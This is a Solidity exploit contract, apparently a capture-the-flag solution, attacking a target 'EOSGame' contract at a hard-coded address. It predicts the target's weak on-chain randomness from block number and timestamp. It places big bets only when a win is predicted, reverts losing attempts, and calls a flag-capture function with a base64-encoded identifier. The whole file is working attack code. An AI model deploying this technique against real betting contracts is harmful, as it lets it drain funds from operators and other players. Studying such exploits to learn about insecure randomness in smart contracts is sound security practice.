contract Attack {

    address targetContract = 0x804d8B0f43C57b5Ba940c1d1132d03f1da83631F;
    int betCount = 0;
    
    function init() public {
        EOSGame(targetContract).initFund();
        betCount = 1;
    }
    
    function exploit() public returns (int) {

        if (isWin()) {
         EOSGame(targetContract).bigBlind();
         betCount += 1;
         return 1;   
        } else {
        revert();
         return 0; 
        }
    }
    
    function getFlag() public {
        EOSGame(0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a).CaptureTheFlag("anVub3JvdXNlQGdtYWlsLmNvbQ==");
    }
    
    function getBetCount() public view returns (int) {
        return betCount;
    }
    
    function isWin() returns (bool) {
        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));
        uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));
        uint256 shark = seed_hash % 20; // 20
        uint256 lucky_hash = uint256(keccak256(abi.encodePacked(betCount)));
        uint256 lucky = lucky_hash % 20; // 20
        
        return shark==lucky;
    }
    
    function viewIsWin(uint256 fuckCount) public view returns (bool) {
        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));
        uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));
        uint256 shark = seed_hash % 20; // 20
        uint256 lucky_hash = uint256(keccak256(abi.encodePacked(fuckCount)));
        uint256 lucky = lucky_hash % 20; // 20
        
        return shark==lucky;
    }
    
    function goCalc() public returns (uint256){
        uint256 x = (EOSGame(targetContract).bet_count(msg.sender));
        for (uint256 i=x; i<x+10;i++) {
         if (viewIsWin(i+1)) {
             EOSGame(targetContract).bigBlind();
             return i;
         } else {
             EOSGame(targetContract).smallBlind();
         }
        }
        return i;
    }
}
